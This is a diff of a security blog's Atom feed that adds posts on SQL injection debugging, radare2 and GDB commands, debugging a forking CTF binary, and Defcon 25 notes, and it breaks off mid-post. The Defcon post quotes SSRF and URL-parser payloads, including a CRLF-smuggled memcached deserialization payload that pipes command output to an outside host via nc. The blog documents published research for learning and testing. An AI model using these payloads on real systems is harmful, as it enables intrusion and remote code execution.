@@ -1,1 +1,554 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-04-07T14:45:09+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hackallthethings.xyz</title><subtitle>A personal site for Hland about information security. </subtitle></feed>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-04-07T17:59:47+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Hackallthethings.xyz</title><subtitle>A personal site for Hland about information security. </subtitle><entry><title type="html">Tricks for debugging SQL Injection Exploitation</title><link href="http://localhost:4000/2018/09/26/tricks-for-debugging-sql-injection.html" rel="alternate" type="text/html" title="Tricks for debugging SQL Injection Exploitation" /><published>2018-09-26T18:23:00+02:00</published><updated>2018-09-26T18:23:00+02:00</updated><id>http://localhost:4000/2018/09/26/tricks-for-debugging-sql-injection</id><content type="html" xml:base="http://localhost:4000/2018/09/26/tricks-for-debugging-sql-injection.html">&lt;p&gt;Here are a few tricks that are useful for debugging SQL injection bugs on OS X when you have the codebase, can run the application locally and wanna see the actually queries being run in the database. My use-case for this is automating exploitation of relatively complex SQL injections with SQLMap to prove data exfiltration capabilities through a vulnerability.&lt;/p&gt;
+
+&lt;p&gt;This is targeted at MySQL running on OS X and installed via HomeBrew. I like to use &lt;a href=&quot;https://www.sequelpro.com/&quot;&gt;Sequel Pro&lt;/a&gt; as it’s nice to have some GUI support and don’t have to lookup how to setup permissions and such every time you wanna setup a database.&lt;/p&gt;
+
+&lt;p&gt;First, to install MySQL via HomeBrew:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;brew&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;brew&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;services&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;brew&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;services&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Enable query logging. Run this from a MySQL prompt:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;set GLOBAL general_log = 'ON';
+SHOW VARIABLES LIKE '%general_log%'`
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Watch the SQL queries hit your database while you run SQLMap or some other gatling-gun style tool against your local application.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tail -f /usr/local/var/mysql/&amp;lt;your-hostname&amp;gt;.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Hland</name></author><summary type="html">Here are a few tricks that are useful for debugging SQL injection bugs on OS X when you have the codebase, can run the application locally and wanna see the actually queries being run in the database. My use-case for this is automating exploitation of relatively complex SQL injections with SQLMap to prove data exfiltration capabilities through a vulnerability.</summary></entry><entry><title type="html">My Radare2 Cheat Sheet</title><link href="http://localhost:4000/2018/08/17/my-radare2-cheat-sheet.html" rel="alternate" type="text/html" title="My Radare2 Cheat Sheet" /><published>2018-08-17T15:12:00+02:00</published><updated>2018-08-17T15:12:00+02:00</updated><id>http://localhost:4000/2018/08/17/my-radare2-cheat-sheet</id><content type="html" xml:base="http://localhost:4000/2018/08/17/my-radare2-cheat-sheet.html">&lt;h2 id=&quot;renaming&quot;&gt;Renaming&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# rename a function
+s &amp;lt;function_flag&amp;gt;
+afvn [new_name]
+
+# List local function variables
+afv
+# Rename variable
+afvn [old_name] [new_name]
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;telescoping-stack-view&quot;&gt;Telescoping stack view&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pxr @ esp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;find-symbols-in-libc&quot;&gt;Find symbols in libc&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dmi libc system&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;search-for-strings&quot;&gt;Search for strings&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/ /bin/sh @ &amp;lt;address&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;some-gdb-debugging-tricks-as-well&quot;&gt;Some GDB Debugging tricks as well&lt;/h2&gt;
+
+&lt;p&gt;Inspect the stack&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;x/100b $esp
+x/100s $esp
+x/100x $esp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Disassemble some code:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;disassemble main
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Set a breakpoint:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;break *0xcafebabe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Go to debug mode:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl^x ctrl^a
+layout asm 
+layout regs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;an-out-of-place-strace-command&quot;&gt;An out of place Strace Command&lt;/h2&gt;
+
+&lt;p&gt;To trace only file access:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;strace -e trace=file ./utumno1.out testtest&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Similarly for network, process, ipc or memory:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;strace -e trace=network ./utumno1.out testtest&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strace -e trace=process ./utumno1.out testtest&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strace -e trace=ipc ./utumno1.out testtest&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;strace -e trace=memory ./utumno1.out testtest&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This is very useful for reversing what a binary is doing when there’s no symbols and the debugger is failing us.&lt;/p&gt;</content><author><name>Hland</name></author><category term="radare2" /><category term="reversing" /><category term="cheatsheet" /><summary type="html">Renaming</summary></entry><entry><title type="html">Debugging a Forking Server with r2</title><link href="http://localhost:4000/2018/01/21/debugging-forking-server-with-r2_1.html" rel="alternate" type="text/html" title="Debugging a Forking Server with r2" /><published>2018-01-21T11:26:00+01:00</published><updated>2018-01-21T11:26:00+01:00</updated><id>http://localhost:4000/2018/01/21/debugging-forking-server-with-r2_1</id><content type="html" xml:base="http://localhost:4000/2018/01/21/debugging-forking-server-with-r2_1.html">&lt;p&gt;This post will show you how to debug a forking server using &lt;a href=&quot;https://github.com/radare/radare2&quot;&gt;Radare2&lt;/a&gt;. It will not show how to solve this challenge though, there are probably some good write-ups out there if you know where to look.&lt;/p&gt;
+
+&lt;p&gt;The example program is a 150 point reversing CTF challenge from Asis Quals in 2014 and can be found &lt;a href=&quot;http://shell-storm.org/repo/CTF/ASIS-Quals-2014/reverse/re_150_36f68dc6c8821f4b8fc80e5f74b56e32&quot;&gt;here&lt;/a&gt;. The program is in ELF64 format and when running it, it starts a server listening on TCP 25565 as you will see from analyzing the binary.&lt;/p&gt;
+
+&lt;p&gt;Note that I’ve renamed the file to &lt;code class=&quot;highlighter-rouge&quot;&gt;re_150&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file re_150
+re_150: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=712afba37f0d7e5a358b1cf522afd3bdaa36f16b, stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Assuming you have Radare2 setup on you machine, we start off by loading the binary and let r2 do analysis on it:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 -A ./re_150
+:&amp;gt; VV @ main
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://2.bp.blogspot.com/-v1vpEcLKf3U/WmNyrTupt5I/AAAAAAAAUBk/9v5TB9rC26ki--vpilMP1X-6Nmut--qYwCLcBGAs/s1600/Screen+Shot+2018-01-20+at+5.47.22+PM.png&quot; alt=&quot;enter image description here&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The first function we encounter is &lt;code class=&quot;highlighter-rouge&quot;&gt;sub.socket_9b5&lt;/code&gt;. Let’s analyze this function in visual mode:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; VV @ sub.socket_9b5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can see that the this function calls &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt;. One number that stood out to me before the call to &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; was &lt;code class=&quot;highlighter-rouge&quot;&gt;0x63dd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://4.bp.blogspot.com/-OE4FM-7pIqs/WmN4Y3qUfJI/AAAAAAAAUB8/hW_sYckUNIwt9uDgxx4RhNlSKuBdStsWQCEwYBhgL/s1600/Screen+Shot+2018-01-20+at+6.11.39+PM.png&quot; alt=&quot;The program setting up listening TCP port&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; ? 0x63dd
+25565 0x63dd 061735 25.0K 0000:03dd 25565 &quot;\xddc&quot; 0b0110001111011101 25565.0 25565.000000f 25565.000000 0t1022001212
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So this confirms that it is this program listening on port 25565.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://2.bp.blogspot.com/-F7OV5ckb0aM/WmN4Y1-i9YI/AAAAAAAAUB4/BQpTAZVfTjsOyL0TJuUZaiYBua9gMbKhQCLcBGAs/s1600/Screen%2BShot%2B2018-01-20%2Bat%2B6.07.51%2BPM.png&quot; alt=&quot;The program listening on port 25565&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So next we wanna debug the program to try and find out what happens in the last and most interesting function call in the binary: &lt;code class=&quot;highlighter-rouge&quot;&gt;sub.malloc_f9d&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let’s kill our current session and relaunch the binary in debugging mode, and also let’s do the same analysis we did initially. This requires you to be on a linux platform that can run the ELF64 file.&lt;/p&gt;
+
+&lt;p&gt;It should look similar to this:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ r2 -dA re_150
+Process with PID 4734 started...
+= attach 4734 4734
+bin.baddr 0x00400000
+Using 0x400000
+asm.bits 64
+[x] Analyze all flags starting with sym. and entry0 (aa)
+TODO: esil-vm not initialized
+[x] Analyze len bytes of instructions for references (aar)
+[x] Analyze function calls (aac)
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+= attach 4734 4734
+4734
+ -- This page intentionally left blank.
+[0x7f950325f260]&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The program immediately breaks and we can see where we are at by using &lt;code class=&quot;highlighter-rouge&quot;&gt;dm&lt;/code&gt; to list the memory map of the current process. Mine looks like this:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0000000000400000 # 0x0000000000403000 - usr    12K s -r-x /home/vagrant/ctf/ASIS2014/reverse150/re_150 /home/vagrant/ctf/ASIS2014/reverse150/re_150 ; map.home_vagrant_ctf_ASIS2014_reverse150_re_150._r_x
+0x0000000000603000 # 0x0000000000604000 - usr     4K s -rw- /home/vagrant/ctf/ASIS2014/reverse150/re_150 /home/vagrant/ctf/ASIS2014/reverse150/re_150 ; map.home_vagrant_ctf_ASIS2014_reverse150_re_150._rw
+0x00007f950325e000 # 0x00007f9503281000 * usr   140K s -r-x /lib/x86_64-linux-gnu/ld-2.19.so /lib/x86_64-linux-gnu/ld-2.19.so ; map.lib_x86_64_linux_gnu_ld_2.19.so._r_x
+0x00007f9503480000 # 0x00007f9503482000 - usr     8K s -rw- /lib/x86_64-linux-gnu/ld-2.19.so /lib/x86_64-linux-gnu/ld-2.19.so ; map.lib_x86_64_linux_gnu_ld_2.19.so._rw
+0x00007f9503482000 # 0x00007f9503483000 - usr     4K s -rw- unk0 unk0
+0x00007fff9bb71000 # 0x00007fff9bb92000 - usr   132K s -rw- [stack] [stack] ; map.stack_._rw
+0x00007fff9bb9a000 # 0x00007fff9bb9c000 - usr     8K s -r-x [vdso] [vdso] ; map.vdso_._r_x
+0xffffffffff600000 # 0xffffffffff601000 - usr     4K s -r-x [vsyscall] [vsyscall] ; map.vsyscall_._r_x
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The thing to note from this is that there is a &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; at the memory region that we are currently executing from. We can see that we have not yet made it to our program. So let’s continue execution until we get to the program’s main method:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; dcu main
+continue until 0x00402531 using 1 bpsize
+hit breakpoint at: 402531
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Doing something like&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; VV
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;or&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; pdf 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we can see that we are now in the program’s main function.&lt;/p&gt;
+
+&lt;p&gt;Now let’s let program run freely and let us send some data to it.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; dc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now the socket should be opened and listening for connections on port 25565. Run the following in another shell:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c 'print &quot;hello&quot;' | netcat 127.0.0.1 25565
+hello
+Sorry!
+Sorry!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Alright we get back our own data and 2x”Sorry!”.&lt;/p&gt;
+
+&lt;p&gt;Now let’s configure r2 to help us debug this. Let’s list all the configuration related to debugging:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; e??~dbg
+		 bin.dbginfo: Load debug information at startup if available
+    dbg.aftersyscall: Stop execution before the syscall is executed (see dcs)
+            dbg.args: Set the args of the program to debug
+         dbg.backend: Select the debugger backend
+             dbg.bep: Break on entrypoint
+        dbg.bpinmaps: Force breakpoints to be inside a val
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;There are a few related to forks, let’s set the following two, they will be reset when restarting r2:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x7fca08e80260]&amp;gt; e dbg.follow.child = true
+[0x7fca08e80260]&amp;gt; e dbg.forks = true
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dbg.follow.child: Continue tracing the child process on fork. By default the parent process is traced
+dbg.forks: Stop execution if fork() is done (see dbg.threads)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, restart the process, let it run freely and send it some data again:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x7fca08e80260]&amp;gt; doo
+[0x7f9e89f22260]&amp;gt; dc
+
+# ...meanwhile in another shell
+$ python -c 'print &quot;hello&quot;' | netcat 127.0.0.1 25565
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We should now be able to see the output of the child process:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x7f9e89f22260]&amp;gt; dc
+= attach 4770 4770
+Waiting for clients...Accepting new clientWaiting to recieve data...
+received buffer is : hello
+
+Waiting to recieve data...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Alright, now r2 follows the child process resulting from the fork. Let’s set a breakpoint on the function we are interested in and restart execution:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; db sub.malloc_f9d 
+:&amp;gt; doo
+:&amp;gt; dc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If all went well the program should now be waiting for input. Let’s give it some by running the same python command as before:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'print &quot;hello&quot;' | netcat 127.0.0.1 25565
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now we don’t see any output since the debugger hit a breakpoint in the child process. We can confirm this by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;dp&lt;/code&gt; command and checking it against the Linux process list.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x00401f9d]&amp;gt; dp
+Selected: 4913 4913
+ * 4913 uid:0 s (current)
+ - 4907 uid:1000 s (ppid)
+
+[0x00401f9d]&amp;gt; !ps faux  | grep re_150
+vagrant   4899  0.0  0.2  11136  1384 pts/1    S+   17:49   0:00  |           \_ /bin/bash /home/vagrant/ctf-tools/bin/r2 -dA re_150
+vagrant   4900  0.0  3.0 101516 15296 pts/1    S+   17:49   0:00  |               \_ /home/vagrant/ctf-tools/radare2/bin/radare2.real -dA re_150
+vagrant   4907  0.0  0.2  12536  1068 pts/1    S+   17:51   0:00  |                   \_ /home/vagrant/ctf/ASIS2014/reverse150/re_150
+vagrant   4913  0.0  0.0  12536   172 pts/1    t+   17:52   0:00  |                   |   \_ /home/vagrant/ctf/ASIS2014/reverse150/re_150
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Going into visual mode we can see that we are at the top of the &lt;code class=&quot;highlighter-rouge&quot;&gt;sub.malloc_f9d&lt;/code&gt; function and that there’s a ton of local variables being allocated on the stack.&lt;/p&gt;
+
+&lt;p&gt;Now we can start debugging this function by for instance going into &lt;code class=&quot;highlighter-rouge&quot;&gt;visual panels&lt;/code&gt; mode in r2 where we have a nice overview of what happens on the stack and to the registers.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:&amp;gt; V!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Hland</name></author><summary type="html">This post will show you how to debug a forking server using Radare2. It will not show how to solve this challenge though, there are probably some good write-ups out there if you know where to look.</summary></entry><entry><title type="html">Defcon 25 Takeaways</title><link href="http://localhost:4000/2017/07/30/hello.html" rel="alternate" type="text/html" title="Defcon 25 Takeaways" /><published>2017-07-30T00:00:00+02:00</published><updated>2017-07-30T00:00:00+02:00</updated><id>http://localhost:4000/2017/07/30/hello</id><content type="html" xml:base="http://localhost:4000/2017/07/30/hello.html">&lt;p&gt;This July I had the pleasure of attending Defcon anniversary 25th time and these are my take-aways from the conference.&lt;/p&gt;
+
+&lt;p&gt;My goal when going to Defcon is to get inspired and motivated by the great work of others and to be able to incorporate new ideas and techniques into existing work. There is a myriad of great work being presented or taught at Defcon and it is overwhelming to take it all in. Especially when adding in the masses of people lining up and wandering around making a semi-introvert wanna crawl back into bed..&lt;/p&gt;
+
+&lt;h2 id=&quot;notable-presentations&quot;&gt;Notable presentations:&lt;/h2&gt;
+
+&lt;h3 id=&quot;orange-tsai---a-new-era-of-exploiting-url-parser-in-trending-programming-languages&quot;&gt;Orange Tsai - A new Era of Exploiting URL Parser in trending programming languages&lt;/h3&gt;
+
+&lt;p&gt;This little gem presents techniques for finding and exploiting SSRF which are directly applicable in testing applications. Abusing the discrepancy between RFCs 2396 and 3986 in libraries Orange Tsai has found that many libraries are vulnerable to these tricks in different situations. This results in payloads like the following:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://foo@evil.com:80@google.com/
+http://hackallthethings.xyz/－＊/etc/passwd
+http://hackallthethings.xyz/ＮＮ/etc/passwd
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that the -* characters are actually unicode characters for &lt;code class=&quot;highlighter-rouge&quot;&gt;%0d&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;%0a&lt;/code&gt; which break the NodeJS protection against CRLF injection.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python
+&amp;gt;&amp;gt;&amp;gt; print(u'\uff0d')
+－
+&amp;gt;&amp;gt;&amp;gt; print(u'\uff0a')
+＊
+&amp;gt;&amp;gt;&amp;gt; print(u'\uff2e')
+Ｎ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;List of &lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_Unicode_characters&quot;&gt;unicode characters here&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Another example that abuses decimal support in &lt;code class=&quot;highlighter-rouge&quot;&gt;gethostbyname()&lt;/code&gt; (RFC1035):&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; print host
+\o\r\a\n\g\e.t\w
+&amp;gt;&amp;gt;&amp;gt; socket.gethostbyname(host)
+'50.116.8.239'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Orange also chained SSRF to exploit internal services via protocol smuggling and libraries vulnerable to CRLF injection.&lt;/p&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://0:8000/composer/send_email
+?to=orange@chroot.org&amp;amp;url=http://127.0.0.1:11211/%0D%0Aset%20githubproductionsearch/queries/code_query%3A857be82362ba02525cef496458ffb09cf30f6256%3Av3%3Acount%200%2060%20150%0D%0A%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%07%3A%0E%40instanceo%3A%08ERB%07%3A%09%40srcI%22%1E%60id%20%7C%20nc%20orange.tw%2012345%60%06%3A%06ET%3A%0C%40linenoi%00%3A%0C%40method%3A%0Bresult
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are tons of examples in this talk and I have yet to dig through them all and test them, but it’s definitely lots of stuff that will improve testing of SSRF and inspire new tricks and ideas. 
+Also there are some good references in this talk:
+&lt;a href=&quot;https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.xm4muaotv626&quot;&gt;SSRF Bible&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;r&quot;&gt;r&lt;/h3&gt;
+
+&lt;p&gt;All content is available at the &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2025/&quot;&gt;Defcon Media Server&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="defcon" /><category term="dc25" /><category term="ssrf" /><summary type="html">This July I had the pleasure of attending Defcon anniversary 25th time and these are my take-aways from the conference.</summary></entry><entry><title type="html">Installing ASUS AWUS036NHA on Windows 10</title><link href="http://localhost:4000/2017/06/23/installing-asus-awus036nha-on-windows-10.html" rel="alternate" type="text/html" title="Installing ASUS AWUS036NHA on Windows 10" /><published>2017-06-23T20:41:00+02:00</published><updated>2017-06-23T20:41:00+02:00</updated><id>http://localhost:4000/2017/06/23/installing-asus-awus036nha-on-windows-10</id><content type="html" xml:base="http://localhost:4000/2017/06/23/installing-asus-awus036nha-on-windows-10.html">Due to shoddy WiFi in my office I had to setup my computer with another adapter to try to get some better signal.&lt;br /&gt;&lt;br /&gt;If you are on Windows 10, going to &quot;Device management&quot; and clicking &quot;Update driver&quot; is all it takes to get the drivers for this adapter.&lt;br /&gt;&lt;br /&gt;Just like this blog post from Alfa Networks says:&lt;br 